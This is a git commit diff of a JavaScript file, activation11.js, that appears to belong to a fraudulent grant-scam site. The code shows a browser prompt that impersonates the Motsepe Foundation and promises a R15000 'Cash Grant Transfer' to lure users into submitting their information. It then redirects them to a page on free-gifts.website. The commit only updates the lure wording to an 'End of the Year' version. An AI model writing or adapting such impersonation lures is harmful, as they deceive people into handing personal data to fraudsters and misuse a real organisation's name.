75b08111b02b1305b972552e410652eed5422961
giftedgb <webmita01@gmail.com>
2025-12-02 01:16:00 +0100

    Update activation11.js

--- activation11.js
+++ activation11.js
@@ -1,5 +1,5 @@
 var password = 'Submit Now'
-password=prompt('Motsepe Foundation: Congratulations, you are eligible to receive the R15000 Motsepe Foundation Cash Grant Transfer, Kindly press OK to submit your information and receive your R15000 now','Submit Now');
+password=prompt('Motsepe Foundation: Congratulations, you are eligible to receive the R15000 End of the Year Motsepe Foundation Cash Grant Transfer, Kindly press OK to submit your information and receive your R15000 now','Submit Now');
 if (password != 'Submit Now') {
 location.href='https://free-gifts.website/Motsepe-PYEI-2025-Grant.html';
 }
